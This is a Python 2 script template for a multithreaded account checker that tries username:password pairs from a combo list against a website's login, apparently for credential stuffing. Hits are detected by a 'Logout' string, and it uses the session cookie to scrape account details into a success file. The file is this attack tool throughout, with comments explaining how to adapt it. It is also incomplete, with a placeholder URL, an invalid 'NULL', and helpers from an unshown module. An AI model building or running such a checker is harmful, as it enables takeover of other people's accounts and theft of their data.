#!/usr/bin/env python
# -*- coding: utf-8 -*-
#$ pip install lxml,beautifulsoup,requests

import requests, sys, string, threading, fileWithAllFuckingsFunctions
#from bs4 import BeautifulSoup
global aList
global sList
global bit
global threadc

def checkThisFuckingAccount(username,password):
	global sList
	global threadc
	#If u use "sendThisFuckingRequest", the function return 2 values, the source of the page and the cookie, so, for store the result :
	SourcePage,Cookie = sendThisFuckingRequest('POST','url')#after "url" u can insert data,cookie and header arguments (data+header = tuple)

	#So, now the result is stored on "SourcePage", u can check the result :
	if SourcePage.find('Logout') > 0:
		print "Hello, it's me..."
		#So... If u need to get an other page with this account, u should use the Cookie variable, we can do like ...
		sendThisFuckingRequest('get','url',NULL,Cookie)
		#Now, u want (yeah u fucking want to do this) capture an element of the page, u can do with this function :
		TextCaptured = getThisFuckingCapture('<strong class="important_text">','</strong',0)#Here, the function get all the text beetween "<strong..." and "</strong", the last argument is the Idex, if u want the number 2 of the results (exmpl : if u have 3 "<strong..." and "</strong")
		#Now, we can structure the result to write into the success file :
		TheFuckingTextToWrite = '%s:%s\n%s\n--------\n' % (username,password,TextCaptured)
		#And write the result to the success file :
		writeThisFuckingSuccess(TheFuckingTextToWrite,sList)
		#And now we can touch urself
	else:
		print "Hello darkness my old friend..."
		#u can write the checked accounts for run the checker without check one more time the checked accounts (u see what i mean ?) 
		TheFuckingTextToWrite = '%s:%s\n' % (username,password)
		writeThisFuckingChecked(TheFuckingTextToWrite,sList)
	threadc -= 1
	return 1

if __name__ == '__main__':

	checkTheseFuckingsArguments()

	sList = sys.argv[1]
	aList = parseThisFuckingList(sList)
	bit = int(sys.argv[2])

	runThisFuckingChecker()